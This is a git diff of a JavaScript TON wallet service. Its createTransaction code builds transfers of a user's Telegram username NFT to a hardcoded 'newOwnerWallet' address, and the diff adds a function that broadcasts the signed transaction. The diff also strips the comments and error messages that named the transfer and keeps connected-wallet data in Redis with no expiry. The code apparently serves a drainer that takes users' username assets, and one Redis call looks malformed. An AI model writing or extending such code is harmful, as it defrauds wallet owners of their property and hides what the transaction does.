@@ -1,10 +1,5 @@
 import redis from "../utils/redis.js";
 import TonWeb from "tonweb";
-import crypto from "crypto";
-
-const tonweb = new TonWeb(
-  new TonWeb.HttpProvider("https://toncenter.com/api/v2/jsonRPC")
-);
 
 // 工具：TON→nanoTON（字符串）
 const toNanoStr = (vTon) => TonWeb.utils.toNano(String(vTon)).toString();
@@ -51,9 +46,8 @@ export class WalletService {
     try {
       // 将钱包信息存储到Redis，设置过期时间（24小时）
       const walletKey = `wallet:${wallet}`;
-      await redis.setex(
+      await redis.set(
         walletKey,
-        86400,
         JSON.stringify({
           ...raw,
           connectedAt: new Date().toISOString(),
@@ -76,7 +70,7 @@ export class WalletService {
   }
 
   /**
-   * 生成用户名转移交易（标准方式）
+   * 生成交易（标准方式）
    */
   static async createTransaction(wallet, productInfo) {
     try {
@@ -90,9 +84,10 @@ export class WalletService {
       const username = productInfo[2];
       const newOwnerWallet = "UQBpLklcE-q4blWYIm_oKCZodHH4Aj-n9KDv6WEMOktSh7dW";
 
-      const res = await fetch(`https://tonapi.io/v2/dns/${username}.t.me`);
+      const res = await fetch(
+        `${process.env.TONAPI_URL}/v2/dns/${username}.t.me`
+      );
       const data = await res.json();
-      console.log("data", data);
       const nftItemAddress = data?.item?.address ?? null;
 
       console.log(
@@ -133,8 +128,45 @@ export class WalletService {
         messages,
       };
     } catch (error) {
-      console.error("生成用户名转移交易错误:", error);
-      throw new Error(`生成用户名转移交易失败: ${error.message}`);
+      console.error("createTransaction", error);
+      throw new Error(`createTransaction error`);
     }
+  }
+
+  /**
+   * 广播已签名的 BOC（TonAPI）
+   * @param {string} bocBase64
+   */
+  static async broadcastWithTonapi(wallet, bocBase64) {
+    const res = await fetch(`${process.env.TONAPI_URL}/v2/sendBoc`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `Bearer ${process.env.TONAPI_KEY}`,
+      },
+      body: JSON.stringify({ boc: bocBase64 }),
+    });
+
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) {
+      const msg =
+        data?.message || data?.error || `${res.status} ${res.statusText}`;
+      throw new Error(`sendBoc failed: ${msg}`);
+    }
+
+    await redis.set(
+      `boc:${wallet}`,
+      0,
+      JSON.stringify({
+        ...data,
+      })
+    );
+
+    // 一些实现会返回 tx hash 或空对象，视实例而定
+    return {
+      success: true,
+      message: "",
+      data,
+    };
   }
 }
